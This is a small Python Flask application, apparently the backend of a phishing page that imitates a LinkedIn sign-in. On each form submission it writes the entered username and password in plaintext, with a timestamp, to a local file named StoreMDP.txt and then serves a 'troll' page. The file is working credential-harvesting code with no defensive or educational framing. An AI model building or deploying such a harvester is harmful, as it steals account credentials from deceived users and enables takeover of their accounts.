import pdb
from flask import Flask, render_template, request
from func_api import *
import os
from datetime import datetime


app = Flask(__name__)

@app.route('/', methods = ['GET','POST'])

def hello_world():
    request_type_str = request.method
    if request_type_str == 'GET':
        return render_template('index.html')
    else :

        #text = request.form['text']
        now = datetime.now()
        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
        user = request.form['session_key']
        psw = request.form['session_password']
        f = open("StoreMDP.txt", "a")
        f.write("\n***********\n")
        f.write("date  = "+dt_string+"\n")
        f.write("Username = "+user+"\n")
        f.write("password = "+psw+"\n***********\n")
        f.close()
        #return render_template('index.html', href=path, input=text, output=preds_as_str[1:-1])
        #return render_template('index.html')
        #return render_template('troll.html', href="https://www.linkedin.com/")
        return render_template('troll.html')
    #return preds_as_str
        
if __name__ == "__main__":
    #with local IP
    #app.run(host='0.0.0.0', port=5000)
    app.run(host='localhost', port=5000)
    #with local host
    #app.run()
